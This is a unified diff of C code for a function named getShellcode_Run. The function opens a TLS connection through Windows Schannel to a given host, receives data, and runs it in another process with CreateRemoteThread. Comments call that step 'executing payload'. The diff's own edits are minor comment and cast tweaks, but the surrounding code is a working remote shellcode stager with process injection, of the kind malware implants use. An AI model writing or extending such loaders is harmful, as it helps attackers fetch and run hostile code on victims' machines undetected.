@@ -423,7 +423,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     schannelCred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT;
 
     TimeStamp tsExpiry;
-    secStatus = AcquireCredentialsHandleA(NULL, (LPSTR)UNISP_NAME_A, SECPKG_CRED_OUTBOUND, 
+    secStatus = AcquireCredentialsHandleA(NULL, UNISP_NAME_A, SECPKG_CRED_OUTBOUND, 
                                           NULL, &schannelCred, NULL, NULL, &hCred, &tsExpiry);
     if (secStatus != SEC_E_OK) {
         printf("AcquireCredentialsHandle failed: %x\n", secStatus);
@@ -515,7 +515,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         goto Cleanup;
     }
 
-    // Allocate buffer for encrypted data
+    // Allocate buffer for encrypted data (header + message + trailer)
     char* encryptedBuf = (char*)malloc(sizes.cbHeader + sizes.cbMaximumMessage + sizes.cbTrailer);
     if (!encryptedBuf) {
         printf("Memory allocation failed for encryptedBuf\n");
@@ -524,16 +524,16 @@ void getShellcode_Run(char* host, char* port, char* resource) {
 
     // Prepare the buffers for encryption
     SecBuffer bufs[3];
-    bufs[0].pvBuffer = encryptedBuf;
+    bufs[0].pvBuffer = encryptedBuf;                        // Header
     bufs[0].cbBuffer = sizes.cbHeader;
     bufs[0].BufferType = SECBUFFER_STREAM_HEADER;
 
-    bufs[1].pvBuffer = encryptedBuf + sizes.cbHeader;
+    bufs[1].pvBuffer = encryptedBuf + sizes.cbHeader;       // Data
     bufs[1].cbBuffer = strlen(sendbuf);
     bufs[1].BufferType = SECBUFFER_DATA;
     memcpy(bufs[1].pvBuffer, sendbuf, bufs[1].cbBuffer);
 
-    bufs[2].pvBuffer = encryptedBuf + sizes.cbHeader + bufs[1].cbBuffer;
+    bufs[2].pvBuffer = encryptedBuf + sizes.cbHeader + bufs[1].cbBuffer; // Trailer
     bufs[2].cbBuffer = sizes.cbTrailer;
     bufs[2].BufferType = SECBUFFER_STREAM_TRAILER;
 
@@ -549,8 +549,10 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         goto Cleanup;
     }
 
-    // Send the encrypted data (header + data + trailer)
+    // Calculate total size of encrypted data after encryption
     int totalSize = bufs[0].cbBuffer + bufs[1].cbBuffer + bufs[2].cbBuffer;
+
+    // Send the encrypted data
     iResult = send(ConnectSocket, encryptedBuf, totalSize, 0);
     if (iResult == SOCKET_ERROR) {
         printf("send failed: %d\n", WSAGetLastError());
@@ -558,7 +560,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         goto Cleanup;
     }
 
-    free(encryptedBuf); // Free after sending
+    free(encryptedBuf); // Free after successful send
     encryptedBuf = NULL;
 
     // Receive and decrypt the response
@@ -587,7 +589,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
                 HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, 
                                                        (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
                 CloseHandle(processHandle);
-                break;  // Exit after executing payload
+                break; // Exit after executing payload
             } else if (secStatus == SEC_E_INCOMPLETE_MESSAGE) {
                 continue; // Wait for more data
             } else {
